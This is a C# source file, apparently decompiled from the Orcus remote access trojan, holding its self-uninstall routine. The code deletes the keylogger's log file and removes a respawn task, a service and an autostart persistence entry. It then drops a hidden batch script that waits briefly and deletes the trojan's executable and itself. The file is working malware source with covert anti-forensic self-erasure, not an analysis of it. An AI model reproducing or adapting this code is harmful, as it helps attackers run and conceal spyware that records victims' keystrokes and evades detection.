using System;
using System.Diagnostics;
using System.IO;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Protection;
using Orcus.Service;
using Orcus.Shared.Utilities;

namespace Orcus.Core;

public static class UninstallHelper
{
	public static void UninstallAndClose()
	{
		RemoveAllDependencies();
		RemovePrivateFiles();
		RemoveOtherStuff();
		UninstallPlugins();
		PrepareOrcusFileToRemove();
		ProcessStartInfo applicationDeletingScript = GetApplicationDeletingScript();
		Program.Unload();
		Process.Start(applicationDeletingScript);
		Program.Exit();
	}

	public static void RemoveOtherStuff()
	{
		try
		{
			RespawnTask.RemoveRespawnTask();
		}
		catch (Exception)
		{
		}
	}

	public static void RemovePrivateFiles()
	{
		try
		{
			if (File.Exists(Consts.KeyLogFile))
			{
				File.Delete(Consts.KeyLogFile);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(Consts.ExceptionFile))
			{
				File.Delete(Consts.ExceptionFile);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (Directory.Exists(Consts.PluginsDirectory))
			{
				Directory.Delete(Consts.PluginsDirectory, recursive: true);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void RemoveAllDependencies()
	{
		try
		{
			ServiceInstaller.Uninstall();
		}
		catch (Exception)
		{
		}
		try
		{
			Autostarter.RemoveFromAutostart();
		}
		catch (Exception)
		{
		}
	}

	public static void PrepareOrcusFileToRemove()
	{
		File.SetAttributes(Consts.ApplicationPath, FileAttributes.Normal);
	}

	public static ProcessStartInfo GetApplicationDeletingScript()
	{
		string applicationPath = Consts.ApplicationPath;
		string freeTempFileName = FileExtensions.GetFreeTempFileName("bat");
		string contents = $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{applicationPath}\"\r\necho j | del {freeTempFileName}";
		File.WriteAllText(freeTempFileName, contents);
		return new ProcessStartInfo(freeTempFileName)
		{
			WindowStyle = ProcessWindowStyle.Hidden
		};
	}

	public static void UninstallPlugins()
	{
		if (PluginLoader.Current.Loadables.Count <= 0)
		{
			return;
		}
		foreach (ILoadable loadable in PluginLoader.Current.Loadables)
		{
			try
			{
				loadable.Uninstall(Consts.ApplicationPath);
			}
			catch (Exception)
			{
			}
		}
	}
}
